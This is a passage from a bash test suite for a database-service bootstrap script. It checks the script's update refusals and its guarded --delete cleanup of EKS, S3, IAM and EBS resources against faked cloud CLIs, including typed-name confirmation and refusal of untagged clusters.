[[ "$UPDATE_RC" -eq 0 ]] \
  || fail "a trailing slash on the stored control plane was refused (${UPDATE_RC}): $(cat "${UPD}/out")"
pass "a release that reports to another control plane is refused before enrollment"

# Two Teams on one control plane can each own an environment of the same name.
# What tells them apart on the Kubernetes cluster is the Git repository it
# applies its databases from, which the control plane names per environment.
FAKE_UPD_GIT_URL="https://git.example/alpha-prod.git" run_update --update --token t
expect_refused "another Team's repository" "alpha-prod.git"
grep -q "git.example/hub.git" "${UPD}/out" || fail "another Team's repository: the control plane's is not named: $(cat "${UPD}/out")"
FAKE_UPD_GIT_URL="" run_update --update --token t
[[ "$UPDATE_RC" -eq 0 ]] \
  || fail "an environment with no Git repository yet was refused (${UPDATE_RC}): $(cat "${UPD}/out")"
FAKE_UPD_GIT_URL="https://git.example/hub.git/" run_update --update --token t
[[ "$UPDATE_RC" -eq 0 ]] \
  || fail "a trailing slash on the stored Git repository was refused (${UPDATE_RC}): $(cat "${UPD}/out")"
pass "an environment that applies from another Git repository than the control plane names is refused before enrollment"

# A read that fails is not an absent repository: a Forbidden or a dropped
# connection must not let the identity check be skipped. Only a cluster with no
# such resource type, where nothing has been applied yet, has nothing to compare.
FAKE_UPD_GIT_FAIL="forbidden" run_update --update --token t
expect_refused "unreadable Git repository" "forbidden"
grep -q "could not read the Git repository" "${UPD}/out" || fail "unreadable Git repository: the refusal does not say what could not be read: $(cat "${UPD}/out")"
FAKE_UPD_GIT_FAIL="notype" run_update --update --token t
[[ "$UPDATE_RC" -eq 0 ]] \
  || fail "a cluster with no Git repository resource type was refused (${UPDATE_RC}): $(cat "${UPD}/out")"
grep -q "get gitrepository.source.toolkit.fluxcd.io hub --ignore-not-found" "${UPD}/calls" \
  || fail "the Git repository read does not ignore a missing one: $(grep gitrepository "${UPD}/calls")"
pass "a Git repository that cannot be read refuses before enrollment, and a missing one is not an error"

# Git reconciliation is applied in the namespace the control plane names, while
# Helm keeps the namespace the release was installed with. A mismatch would
# move the databases' Kustomization with pruning on, so it refuses.
FAKE_UPD_DB_NS="other-databases" run_update --update --token t
expect_refused "namespace drift" "other-databases"
grep -q "pds" "${UPD}/out" || fail "namespace drift: the control plane's namespace is not named: $(cat "${UPD}/out")"
FAKE_UPD_DB_NS="pds" run_update --update --token t
[[ "$UPDATE_RC" -eq 0 ]] \
  || fail "a release in the namespace the control plane names was refused (${UPDATE_RC}): $(cat "${UPD}/out")"
pass "a release whose database namespace differs from the control plane's is refused before enrollment"

# --reuse-values keeps the old chart's built-in defaults, so the new chart's
# own pin check fails on a real pin change. Without the flag that replaces
# them, there is no update to make.
FAKE_UPD_HELM_HELP="--force-conflicts" run_update --update --token t
expect_refused "old Helm" "Helm 3.14 or newer"
pass "a Helm that cannot reset to the new chart's defaults is refused before enrollment"

# A failed Helm upgrade stops, says where, and offers the commands. Nothing
# rolls back on its own.
FAKE_UPD_HELM_RC=1 run_update --update --token t
[[ "$UPDATE_RC" -ne 0 ]] || fail "a failed Helm upgrade exited 0: $(cat "${UPD}/out")"
grep -q "it stopped at: updating Percona Database Service" "${UPD}/out" \
  || fail "the failed phase is not named: $(cat "${UPD}/out")"
grep -q "the last lines it printed:" "${UPD}/out" \
  || fail "the tail of the failed phase is not offered: $(cat "${UPD}/out")"
grep -q "installing the new release" "${UPD}/out" \
  || fail "the output of the failed phase is not shown: $(cat "${UPD}/out")"
for cmd in "helm status pds --namespace everest-system" "helm history pds --namespace everest-system" "helm rollback pds --namespace everest-system"; do
  grep -q "$cmd" "${UPD}/out" || fail "the failure does not offer '${cmd}': $(cat "${UPD}/out")"
done
grep -q "agent-secret-value" "${UPD}/out" && fail "the failure printed the agent token: $(cat "${UPD}/out")"
grep -q "^helm rollback\|^helm uninstall" "${UPD}/calls" \
  && fail "a failed update rolled itself back: $(cat "${UPD}/calls")"
grep -q '"outcome": "failed"' "${UPD}/calls" \
  || fail "the failed phase was not reported to the control plane: $(cat "${UPD}/calls")"
grep -Eq '^(aws|eksctl) ' "${UPD}/calls" && fail "a failed update called AWS"
pass "a failed update stops at its phase, offers the inspect and rollback commands, and rolls nothing back"

usage_text="$(bash "${SCRIPT}" --help 2>&1 || true)"
[[ "$usage_text" == *"--update"* ]] || fail "the usage text does not document --update: ${usage_text}"
[[ "$usage_text" == *"--token"*"nothing else"* || "$usage_text" == *"takes --token and nothing else"* ]] \
  || fail "the usage text does not say --update takes only --token: ${usage_text}"
pass "the usage text documents --update"

# --- the usage text tells the truth about --status ---
usage_out="$(bash "${SCRIPT}" --help 2>&1 || true)"
[[ "$usage_out" == *"did not finish"* ]] \
  || fail "the usage text does not say --status covers only a run that did not finish: ${usage_out}"
[[ "$usage_out" == *"for a joined"*"environment run --delete"* ]] \
  || fail "the usage text does not point a joined environment to --delete: ${usage_out}"
[[ "$usage_out" != *"cleanup steps"* ]] \
  || fail "the usage text still points at the cleanup steps: ${usage_out}"
[[ "$usage_out" != *"names come from the join token"* ]] \
  || fail "the usage text still says --status names what a finished join made: ${usage_out}"
[[ "$usage_out" == *"percona.com/pds"* ]] \
  || fail "the usage text does not name the ownership tag: ${usage_out}"
[[ "$usage_out" == *"could not tag"* ]] \
  || fail "the usage text promises a tag on a bucket the join could not tag: ${usage_out}"
pass "the usage text says what --status covers and that --delete cleans up after a join"

# --- --delete removes an environment and what its join created ---
# These run the whole script, because what matters is the order: nothing is
# deleted before the name is typed, and an EKS cluster the join did not create
# is refused before anything is touched. The fakes keep a small account in
# files, so a delete changes what the next lookup finds, and every call is
# logged.
DEL="${WORK}/del"
mkdir -p "${DEL}/bin" "${DEL}/world" "${DEL}/home"
sed -e 's#__HUB_URL__#http://localhost:9#' \
  -e 's#__GIT_URL__#https://git.example/hub.git#' \
  -e 's#__DEFAULT_REGION__#us-west-2#' "${SCRIPT}" >"${DEL}/bootstrap.sh"

cat >"${DEL}/bin/aws" <<'EOF'
#!/usr/bin/env bash
echo "aws $*" >>"${DEL_CALLS}"
world="${DEL_WORLD}"
arg_after() {
  local want="$1" prev="" arg
  shift
  for arg in "$@"; do
    if [[ "$prev" == "$want" ]]; then
      printf '%s' "$arg"
      return 0
    fi
    prev="$arg"
  done
}
case "$*" in
  *"sts get-caller-identity"*)
    if [[ "${FAKE_DEL_STS_RC:-0}" != 0 ]]; then
      echo "An error occurred (ExpiredToken) when calling the GetCallerIdentity operation" >&2
      exit 254
    fi
    echo "123456789012"
    ;;
  *"eks describe-cluster"*)
    if [[ ! -f "${world}/cluster" ]]; then
      echo "An error occurred (ResourceNotFoundException) when calling the DescribeCluster operation: No cluster found for name: x." >&2
      exit 254
    fi
    value="$(cat "${world}/cluster")"
    if [[ "$value" == "UNREADABLE" ]]; then
      echo "An error occurred (AccessDeniedException) when calling the DescribeCluster operation: not authorized" >&2
      exit 254
    fi
    if [[ "$value" == "UNTAGGED" ]]; then
      echo "None"
    else
      echo "$value"
    fi
    ;;
  *"eks update-kubeconfig"*)
    [[ "${FAKE_DEL_KUBECONFIG_RC:-0}" == 0 ]] || exit "${FAKE_DEL_KUBECONFIG_RC}"
    echo "kubeconfig ${KUBECONFIG:-unset}" >>"${DEL_CALLS}.kube"
    touch "${KUBECONFIG:?}"
    ;;
  *"resourcegroupstaggingapi get-resources"*)
    if [[ "${FAKE_DEL_TAGAPI_RC:-0}" != 0 && "$*" == *"--resource-type-filters"* ]]; then
      echo "An error occurred (AccessDeniedException) when calling the GetResources operation" >&2
      exit 254
    fi
    want="$(arg_after --tag-filters "$@")"
    want="${want#*Values=}"
    out=""
    if [[ "$*" == *"--resource-type-filters"* ]]; then
      while read -r bucket value; do
        [[ -n "$bucket" && "$value" == "$want" ]] && out="${out:+${out}	}arn:aws:s3:::${bucket}"
      done <"${world}/buckets"
    elif [[ -f "${world}/stray" ]]; then
      out="$(cat "${world}/stray")"
    fi
    echo "$out"
    ;;
  *"iam list-users"*)
    awk '{printf "%s%s", sep, $1; sep="\t"} END {print ""}' "${world}/users"
    ;;
  *"iam list-user-tags"*)
    if [[ "${FAKE_DEL_TAGS_RC:-0}" != 0 ]]; then
      echo "An error occurred (AccessDenied) when calling the ListUserTags operation" >&2
      exit 254
    fi
    user="$(arg_after --user-name "$@")"
    value="$(awk -v u="$user" '$1 == u {print $2}' "${world}/users")"
    echo "${value:-None}"
    ;;
  *"iam list-access-keys"*)
    echo "AKIAKEYONE0000000001	AKIAKEYTWO0000000002"
    ;;
  *"iam list-user-policies"*)
    echo "pds-backup-storage"
    ;;
  *"iam delete-"*)
    if [[ "${FAKE_DEL_IAM_DELETE_RC:-0}" != 0 ]]; then
      echo "An error occurred (DeleteConflict) when calling the DeleteUser operation" >&2
      exit 254
    fi
    [[ "$*" == *"iam delete-user "* ]] || exit 0
    user="$(arg_after --user-name "$@")"
    grep -v "^${user} " "${world}/users" >"${world}/users.new" || true
    mv "${world}/users.new" "${world}/users"
    ;;
  *"s3 rb"*)
    bucket="${3#s3://}"
    if [[ -n "${FAKE_DEL_RB_ERR:-}" ]]; then
      echo "An error occurred (${FAKE_DEL_RB_ERR}) when calling the DeleteBucket operation" >&2
      exit 1
    fi
    grep -v "^${bucket} " "${world}/buckets" >"${world}/buckets.new" || true
    mv "${world}/buckets.new" "${world}/buckets"
    ;;
  *"cloudformation describe-stacks"*)
    stack="$(arg_after --stack-name "$@")"
    if [[ -n "${FAKE_DEL_STACK_ERR:-}" || -f "${world}/stack-err" ]]; then
      echo "An error occurred (AccessDenied) when calling the DescribeStacks operation" >&2
      exit 254
    fi
    if [[ ! -f "${world}/stack.${stack}" ]]; then
      echo "An error occurred (ValidationError) when calling the DescribeStacks operation: Stack with id ${stack} does not exist" >&2
      exit 254
    fi
    cat "${world}/stack.${stack}"
    ;;
  *"cloudformation delete-stack"*)
    if [[ "${FAKE_DEL_DELETE_STACK_RC:-0}" != 0 ]]; then
      echo "An error occurred (AccessDenied) when calling the DeleteStack operation" >&2
      exit 254
    fi
    rm -f "${world}/stack.$(arg_after --stack-name "$@")"
    ;;
  *"ec2 describe-volumes"*)
    volume="$(arg_after --volume-ids "$@")"
    state="$(awk -v v="$volume" '$1 == v {print $2}' "${world}/volumes")"
    if [[ -z "$state" ]]; then
      echo "An error occurred (InvalidVolume.NotFound) when calling the DescribeVolumes operation" >&2
      exit 254
    fi
    echo "$state"
    ;;
  *"ec2 delete-volume"*)
    volume="$(arg_after --volume-id "$@")"
    grep -v "^${volume} " "${world}/volumes" >"${world}/volumes.new" || true
    mv "${world}/volumes.new" "${world}/volumes"
    ;;
esac
exit 0
EOF
cat >"${DEL}/bin/eksctl" <<'EOF'
#!/usr/bin/env bash
echo "eksctl $*" >>"${DEL_CALLS}"
if [[ "$*" == *"delete cluster"* ]]; then
  [[ "${FAKE_DEL_EKSCTL_RC:-0}" == 0 ]] || exit "${FAKE_DEL_EKSCTL_RC}"
  [[ "${FAKE_DEL_CLUSTER_SURVIVES:-0}" == 1 ]] || rm -f "${DEL_WORLD}/cluster"
  [[ "${FAKE_DEL_CLUSTER_SURVIVES:-0}" == 1 ]] || rm -f "${DEL_WORLD}/stack.eksctl-spoke-a-cluster"
  [[ "${FAKE_DEL_STACK_SURVIVES:-0}" == 1 ]] || rm -f "${DEL_WORLD}/stack.eksctl-spoke-a-addon-iamserviceaccount-kube-system-ebs-csi-controller-sa"
  # A throttle or a denial that starts after the long delete.
  [[ "${FAKE_DEL_STACK_ERR_AFTER:-0}" != 1 ]] || touch "${DEL_WORLD}/stack-err"
fi
exit 0
EOF
cat >"${DEL}/bin/kubectl" <<'EOF'
#!/usr/bin/env bash
echo "kubectl $*" >>"${DEL_CALLS}"
echo "kubeconfig ${KUBECONFIG:-unset}" >>"${DEL_CALLS}.kube"
case "$*" in
  *"get namespaces"*)
    exit "${FAKE_DEL_KUBECTL_RC:-0}"
    ;;
  *"get svc"*)
    printf '%s' "${FAKE_DEL_LB_SERVICES:-}"
    ;;
  *"get pv"*)
    printf '%s' "${FAKE_DEL_PV_HANDLES:-}"
    ;;
  *"delete svc"*)
    exit "${FAKE_DEL_KUBECTL_SVC_RC:-0}"
    ;;
  *"delete kustomization"* | *"delete instances"*)
    exit "${FAKE_DEL_KUBECTL_DB_RC:-0}"
    ;;
esac
exit 0
EOF
cat >"${DEL}/bin/curl" <<'EOF'
#!/usr/bin/env bash
echo "curl $*" >>"${DEL_CALLS}"
exit 0
EOF
chmod +x "${DEL}/bin/aws" "${DEL}/bin/eksctl" "${DEL}/bin/kubectl" "${DEL}/bin/curl"

# A terminal for the run, or none. The answer is sent once the confirmation
# prompt is showing, the way a pasted command is answered by hand. The output
# of both streams comes back together.
cat >"${DEL}/run.py" <<'PY'
import os, pty, select, subprocess, sys, time

mode = sys.argv[1]
# The documented invocation is curl | bash -s, so the script is read from a pipe
# and only /dev/tty can answer. DEL_CHILD_PATH, when set, is the whole PATH the
# script sees, to run it without a tool the host may have.
pipe = ["bash", "-c", 'cat "$1" | "$BASH" -s -- "${@:2}"', "pipe"]
if os.environ.get("DEL_CHILD_PATH"):
    pipe[0] = "/bin/bash"
    pipe[2] = 'PATH="$DEL_CHILD_PATH"; /bin/cat "$1" | "$BASH" -s -- "${@:2}"'
if mode == "notty":
    proc = subprocess.run(
        pipe + sys.argv[2:],
        start_new_session=True,
        stdin=subprocess.DEVNULL,
        capture_output=True,
        timeout=60,
    )
    sys.stdout.buffer.write(proc.stdout + proc.stderr)
    sys.exit(proc.returncode)

answer = (sys.argv[2] + "\n").encode()
pid, master = pty.fork()
if pid == 0:
    os.execvp(pipe[0], pipe + sys.argv[3:])
out = b""
sent = False
status = None
deadline = time.time() + 60
while time.time() < deadline:
    ready, _, _ = select.select([master], [], [], 0.2)
    if master in ready:
        try:
            chunk = os.read(master, 4096)
        except OSError:
            chunk = b""
        if chunk:
            out += chunk
            if not sent and b"to confirm: " in out:
                os.write(master, answer)
                sent = True
    wpid, st = os.waitpid(pid, os.WNOHANG)
    if wpid:
        status = st
        break
else:
    os.kill(pid, 15)
    sys.stderr.write("the delete prompt timed out\n")
    sys.stdout.buffer.write(out)
    sys.exit(124)
while True:
    ready, _, _ = select.select([master], [], [], 0.05)
    if not ready:
        break
    try:
        chunk = os.read(master, 4096)
    except OSError:
        break
    if not chunk:
        break
    out += chunk
sys.stdout.buffer.write(out.replace(b"\r\n", b"\n"))
sys.exit(os.WEXITSTATUS(status) if status is not None and os.WIFEXITED(status) else 1)
PY

# del_world sets the account up: an EKS cluster tagged for spoke-a, its bucket,
# its backup IAM user and the EBS CSI role stack. Every tag names the environment.
del_world() {
  rm -f "${DEL}/world/"*
  printf '%s' "${FAKE_DEL_CLUSTER:-spoke-a}" >"${DEL}/world/cluster"
  if [[ "${FAKE_DEL_CLUSTER:-spoke-a}" == "ABSENT" ]]; then
    rm -f "${DEL}/world/cluster"
  fi
  printf '%s\n' "${FAKE_DEL_BUCKETS-pds-123456789012-spoke-a spoke-a}" >"${DEL}/world/buckets"
  printf '%s\n' "${FAKE_DEL_USERS-pds-spoke-a spoke-a}" >"${DEL}/world/users"
  if [[ "${FAKE_DEL_STACK-spoke-a}" != "ABSENT" ]]; then
    printf '%s\n' "${FAKE_DEL_STACK-spoke-a}" \
      >"${DEL}/world/stack.eksctl-spoke-a-addon-iamserviceaccount-kube-system-ebs-csi-controller-sa"
  fi
  # eksctl builds the cluster through a stack of its own, tagged like the cluster.
  local cluster_stack="spoke-a"
  [[ "${FAKE_DEL_CLUSTER:-spoke-a}" != "ABSENT" ]] || cluster_stack="ABSENT"
  cluster_stack="${FAKE_DEL_CLUSTER_STACK-$cluster_stack}"
  if [[ "$cluster_stack" != "ABSENT" ]]; then
    printf '%s\n' "$cluster_stack" >"${DEL}/world/stack.eksctl-spoke-a-cluster"
  fi
  printf '%s' "${FAKE_DEL_VOLUMES-}" >"${DEL}/world/volumes"
  if [[ -n "${FAKE_DEL_STRAY:-}" ]]; then
    printf '%s\n' "$FAKE_DEL_STRAY" >"${DEL}/world/stray"
  fi
  : >"${DEL}/calls"
  : >"${DEL}/calls.kube"
}

# del_run runs the script with the fakes first on PATH and no token, no hub and
# no kubeconfig of the caller's. The first argument is the answer typed at the
# prompt, or "none" for a run with no terminal.
del_run() {
  local answer="$1"
  shift
  export DEL_CALLS="${DEL}/calls" DEL_WORLD="${DEL}/world"
  local mode=(tty "$answer")
  if [[ "$answer" == none ]]; then
    mode=(notty)
  fi
  set +e
  PATH="${DEL}/bin:${PATH}" HOME="${DEL}/home" KUBECONFIG="${DEL}/caller-kubeconfig" \
    python3 "${DEL}/run.py" "${mode[@]}" "${DEL}/bootstrap.sh" "$@" >"${DEL}/out" 2>&1
  DEL_RC=$?
  set -e
}

# del_called is true when the call log has a line starting with the prefix.
del_called() {
  grep -q -- "$1" "${DEL}/calls"
}

# del_before is true only when both calls were made and the first came first. An
# order check on two line numbers alone passes when a call is missing.
del_before() {
  local first second
  first="$(grep -n -- "$1" "${DEL}/calls" | head -n1 | cut -d: -f1)"
  second="$(grep -n -- "$2" "${DEL}/calls" | head -n1 | cut -d: -f1)"
  [[ -n "$first" && -n "$second" && "$first" -lt "$second" ]]
}

# del_line is the line number of the first call that matches, or 0.
del_line() {
  grep -n -- "$1" "${DEL}/calls" | head -n1 | cut -d: -f1
}

# del_mutations prints the calls that change something. A lookup that names a
# tag in its filter is not one.
del_mutations() {
  grep -E '^(eksctl delete|aws s3 rb|aws iam delete-|aws ec2 delete-volume|aws cloudformation delete-stack|kubectl delete)' "${DEL}/calls" || true
}

# --- a delete removes everything the join tagged, once the name is typed ---
FAKE_DEL_VOLUMES=$'vol-0aaa available\nvol-0bbb available\n' del_world
FAKE_DEL_LB_SERVICES=$'pds db-lb\nmonitoring pmm-lb\n' FAKE_DEL_PV_HANDLES=$'ebs.csi.aws.com vol-0aaa ebs.csi.aws.com\nebs.csi.aws.com vol-0bbb ebs.csi.aws.com\n' \
  del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" == 0 ]] || fail "a delete of a tagged environment failed (${DEL_RC}): $(cat "${DEL}/out")"
del_called "^eksctl delete cluster --name spoke-a --region us-west-2 --wait" \
  || fail "the EKS cluster was not deleted and waited on: $(cat "${DEL}/calls")"
del_called "^aws s3 rb s3://pds-123456789012-spoke-a --force" \
  || fail "the backup bucket was not deleted: $(cat "${DEL}/calls")"
for want in \
  "^aws iam delete-access-key --user-name pds-spoke-a --access-key-id AKIAKEYONE0000000001" \
  "^aws iam delete-access-key --user-name pds-spoke-a --access-key-id AKIAKEYTWO0000000002" \
  "^aws iam delete-user-policy --user-name pds-spoke-a --policy-name pds-backup-storage" \
  "^aws iam delete-user --user-name pds-spoke-a"; do
  del_called "$want" || fail "the backup identity was not deleted (${want}): $(cat "${DEL}/calls")"
done
del_before '^aws iam delete-access-key' '^aws iam delete-user-policy' \
  && del_before '^aws iam delete-user-policy' '^aws iam delete-user --user-name' \
  || fail "the IAM user was deleted before its keys and policy, which IAM refuses: $(cat "${DEL}/calls")"
del_before '^eksctl delete cluster' '^aws s3 rb' \
  || fail "the bucket went before the EKS cluster that writes backups to it: $(cat "${DEL}/calls")"
[[ ! -s "${DEL}/world/buckets" && ! -s "${DEL}/world/users" && ! -f "${DEL}/world/cluster" ]] \
  && ! compgen -G "${DEL}/world/stack.*" >/dev/null \
  || fail "something tagged for spoke-a is still in the account: $(ls "${DEL}/world")"
grep -qi "disconnect spoke-a" "${DEL}/out" \
  || fail "the run did not say to disconnect the environment in the console: $(cat "${DEL}/out")"
grep -q "console" "${DEL}/out" \
  || fail "the run did not name the console: $(cat "${DEL}/out")"
del_called "^curl " && fail "a delete called the control plane: $(cat "${DEL}/calls")"
del_called "^helm " && fail "a delete called helm: $(cat "${DEL}/calls")"
pass "--delete removes the EKS cluster, bucket, IAM user and role stack the join tagged"

# --- the plan is shown, with what it deletes, before the name is asked for ---
plan_at="$(grep -n "pds-123456789012-spoke-a" "${DEL}/out" | head -n1 | cut -d: -f1)"
ask_at="$(grep -n "to confirm: " "${DEL}/out" | head -n1 | cut -d: -f1)"
[[ -n "$plan_at" && -n "$ask_at" && "$plan_at" -le "$ask_at" ]] \
  || fail "the prompt came before the list of what is deleted: $(cat "${DEL}/out")"
for want in "123456789012" "us-west-2" "pds-spoke-a" "every backup" "cannot be undone" "aws s3 sync s3://pds-123456789012-spoke-a ./pds-123456789012-spoke-a"; do
  grep -q -- "$want" "${DEL}/out" || fail "the plan did not say ${want}: $(cat "${DEL}/out")"
done
pass "--delete lists what it will delete before it asks"

# --- a Service of type LoadBalancer is deleted and waited for, so the VPC can go ---
del_called "^kubectl delete kustomization instances -n flux-system --ignore-not-found --wait --timeout=" \
  || fail "the Git reconciliation was not deleted, so Flux would bring the databases back: $(cat "${DEL}/calls")"
del_called "^kubectl delete instances.core.openeverest.io --all -A --wait --timeout=" \
  || fail "the database instances were not deleted, waited for and bounded: $(cat "${DEL}/calls")"
del_called "^kubectl get svc -A -o jsonpath=.*LoadBalancer" \
  || fail "the Services of type LoadBalancer were not looked up in every namespace: $(cat "${DEL}/calls")"
for svc in "pds db-lb" "monitoring pmm-lb"; do
  ns="${svc% *}"
  name="${svc#* }"
  del_called "^kubectl delete svc -n ${ns} ${name} --wait --timeout=" \
    || fail "the load balancer ${name} was not deleted and waited for: $(cat "${DEL}/calls")"
done
del_before '^kubectl delete kustomization instances' '^kubectl delete instances' \
  && del_before '^kubectl delete instances' '^kubectl delete svc' \
  && del_before '^kubectl delete svc' '^eksctl delete cluster' \
  || fail "the databases and load balancers did not go before the EKS cluster: $(cat "${DEL}/calls")"
del_called "^kubectl get pv.*persistentVolumeReclaimPolicy==\"Delete\"" \
  || fail "the EBS volumes were not saved, or not only those Kubernetes would delete: $(cat "${DEL}/calls")"
del_before '^kubectl get pv' '^kubectl delete' \
  || fail "the EBS volumes were saved after something was deleted: $(cat "${DEL}/calls")"
del_called "^kubectl delete pvc" \
  && fail "a volume claim was deleted, which stalls on monitoring's claim while its pod runs: $(cat "${DEL}/calls")"
for volume in vol-0aaa vol-0bbb; do
  del_called "^aws ec2 delete-volume --region us-west-2 --volume-id ${volume}" \
    || fail "the EBS volume ${volume} the EKS cluster held was not deleted: $(cat "${DEL}/calls")"
done
del_before '^eksctl delete cluster' '^aws ec2 delete-volume' \
  || fail "a volume was deleted before the nodes that hold it were gone: $(cat "${DEL}/calls")"
[[ ! -s "${DEL}/world/volumes" ]] || fail "a saved volume is still in the account: $(cat "${DEL}/world/volumes")"
[[ ! -e "${DEL}/caller-kubeconfig" ]] \
  || fail "the delete wrote to the caller's kubeconfig: $(ls "${DEL}")"
grep -q "caller-kubeconfig" "${DEL}/calls.kube" \
  && fail "kubectl read the caller's kubeconfig, so it could have reached another cluster: $(cat "${DEL}/calls.kube")"
pass "--delete waits for the load balancers to go before it deletes the EKS cluster"

# A load balancer that will not go is a warning, because eksctl removes what is
# left and the run must not stop with the cluster half deleted.
del_world
FAKE_DEL_LB_SERVICES=$'pds db-lb\n' FAKE_DEL_KUBECTL_SVC_RC=1 \
  del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" == 0 ]] || fail "a load balancer that would not go stopped the delete (${DEL_RC}): $(cat "${DEL}/out")"
del_called "^eksctl delete cluster" || fail "the EKS cluster was not deleted after a load balancer warning: $(cat "${DEL}/calls")"
grep -q "db-lb" "${DEL}/out" || fail "the warning did not name the load balancer: $(cat "${DEL}/out")"
pass "--delete warns about a load balancer that will not go and carries on"

# --- an EKS cluster kubectl cannot reach is still deleted, with a warning ---
del_world
FAKE_DEL_KUBECTL_RC=1 del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" == 0 ]] || fail "an unreachable EKS cluster stopped the delete (${DEL_RC}): $(cat "${DEL}/out")"
grep -q "cannot reach" "${DEL}/out" || fail "an unreachable EKS cluster was not warned about: $(cat "${DEL}/out")"
grep -q "^kubectl delete" "${DEL}/calls" \
  && fail "kubectl deleted something on an EKS cluster it could not reach: $(cat "${DEL}/calls")"
del_called "^eksctl delete cluster" || fail "the unreachable EKS cluster was not deleted: $(cat "${DEL}/calls")"
del_called "^aws s3 rb" || fail "the bucket was not deleted after an unreachable EKS cluster: $(cat "${DEL}/calls")"

del_world
FAKE_DEL_KUBECONFIG_RC=1 del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" == 0 ]] || fail "a kubeconfig that could not be written stopped the delete (${DEL_RC}): $(cat "${DEL}/out")"
grep -q "cannot reach" "${DEL}/out" || fail "a missing kubeconfig was not warned about: $(cat "${DEL}/out")"
del_called "^eksctl delete cluster" || fail "the EKS cluster was not deleted without a kubeconfig: $(cat "${DEL}/calls")"
pass "--delete warns about an EKS cluster kubectl cannot reach and still deletes it"

# --- nothing is deleted until the name is typed ---
del_world
del_run spoke-b --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 ]] || fail "a wrong name confirmed the delete: $(cat "${DEL}/out")"
[[ -z "$(del_mutations)" ]] || fail "something was deleted after a wrong name: $(del_mutations)"
grep -q "Nothing was deleted" "${DEL}/out" || fail "a wrong name did not say nothing was deleted: $(cat "${DEL}/out")"

del_world
del_run "" --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 ]] || fail "an empty answer confirmed the delete: $(cat "${DEL}/out")"
[[ -z "$(del_mutations)" ]] || fail "something was deleted after an empty answer: $(del_mutations)"

del_world
del_run none --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 ]] || fail "a run with no terminal deleted: $(cat "${DEL}/out")"
[[ -z "$(del_mutations)" ]] || fail "something was deleted with no terminal to ask on: $(del_mutations)"
grep -q "terminal" "${DEL}/out" || fail "a run with no terminal did not say why it stopped: $(cat "${DEL}/out")"
pass "--delete deletes nothing until the environment name is typed"

# --- an EKS cluster the join did not create is refused ---
for tag in UNTAGGED other-env; do
  FAKE_DEL_CLUSTER="$tag" del_world
  del_run spoke-a --delete --name spoke-a --region us-west-2
  [[ "$DEL_RC" != 0 ]] || fail "an EKS cluster tagged ${tag} was deleted: $(cat "${DEL}/out")"
  [[ -z "$(del_mutations)" ]] || fail "a refused EKS cluster (${tag}) still had something deleted: $(del_mutations)"
  grep -q "percona.com/pds" "${DEL}/out" || fail "the refusal did not name the tag (${tag}): $(cat "${DEL}/out")"
  grep -q "Nothing was deleted" "${DEL}/out" || fail "the refusal did not say nothing was deleted (${tag}): $(cat "${DEL}/out")"
  grep -q "to confirm: " "${DEL}/out" && fail "a refused EKS cluster (${tag}) still asked to confirm: $(cat "${DEL}/out")"
  [[ -s "${DEL}/world/buckets" && -s "${DEL}/world/users" ]] || fail "a refused run deleted the bucket or the user (${tag})"
done
FAKE_DEL_CLUSTER=UNREADABLE del_world
del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 ]] || fail "an EKS cluster that could not be read was deleted: $(cat "${DEL}/out")"
[[ -z "$(del_mutations)" ]] || fail "an unreadable EKS cluster still had something deleted: $(del_mutations)"
pass "--delete refuses an EKS cluster without this environment's tag"

# --- an EKS cluster that is already gone leaves its tagged bucket, user and stack to delete ---
FAKE_DEL_CLUSTER=ABSENT del_world
del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" == 0 ]] || fail "a delete after the EKS cluster went failed (${DEL_RC}): $(cat "${DEL}/out")"
del_called "^eksctl " && fail "eksctl ran for an EKS cluster that is gone: $(cat "${DEL}/calls")"
del_called "^kubectl " && fail "kubectl ran for an EKS cluster that is gone: $(cat "${DEL}/calls")"
del_called "^aws s3 rb s3://pds-123456789012-spoke-a" || fail "the bucket was not deleted: $(cat "${DEL}/calls")"
del_called "^aws iam delete-user --user-name pds-spoke-a" || fail "the IAM user was not deleted: $(cat "${DEL}/calls")"
del_called "^aws cloudformation delete-stack --stack-name eksctl-spoke-a-addon-iamserviceaccount-kube-system-ebs-csi-controller-sa --region us-west-2" \
  || fail "the EBS CSI role stack was not deleted: $(cat "${DEL}/calls")"
pass "--delete finishes what an earlier run left when the EKS cluster is gone"

# --- the role stack goes with the cluster, or is deleted when it stays ---
del_world
FAKE_DEL_STACK_SURVIVES=1 del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" == 0 ]] || fail "a surviving role stack stopped the delete (${DEL_RC}): $(cat "${DEL}/out")"
del_called "^aws cloudformation delete-stack --stack-name eksctl-spoke-a-addon-iamserviceaccount-kube-system-ebs-csi-controller-sa" \
  || fail "the role stack that survived the cluster delete was not deleted: $(cat "${DEL}/calls")"
del_before '^eksctl delete cluster' '^aws cloudformation delete-stack' \
  || fail "the role stack was deleted before the EKS cluster that uses it: $(cat "${DEL}/calls")"

# A stack of the same name that carries no tag for this environment is not the join's.
FAKE_DEL_STACK=another-env del_world
FAKE_DEL_STACK_SURVIVES=1 del_run spoke-a --delete --name spoke-a --region us-west-2
del_called "^aws cloudformation delete-stack" \
  && fail "a role stack tagged for another environment was deleted: $(cat "${DEL}/calls")"
pass "--delete deletes the role stack only when it carries this environment's tag"

# --- a failed EKS cluster delete keeps the bucket and the user ---
del_world
FAKE_DEL_EKSCTL_RC=1 del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 ]] || fail "a failed EKS cluster delete exited 0: $(cat "${DEL}/out")"
del_called "^aws s3 rb" && fail "the bucket was deleted while the EKS cluster still ran: $(cat "${DEL}/calls")"
del_called "^aws iam delete-user" && fail "the IAM user was deleted while the EKS cluster still ran: $(cat "${DEL}/calls")"
grep -q "same command again" "${DEL}/out" || fail "the failure did not say how to carry on: $(cat "${DEL}/out")"
pass "--delete keeps the bucket and the IAM user when the EKS cluster delete fails"

# --- nothing tagged means nothing to delete, and no prompt ---
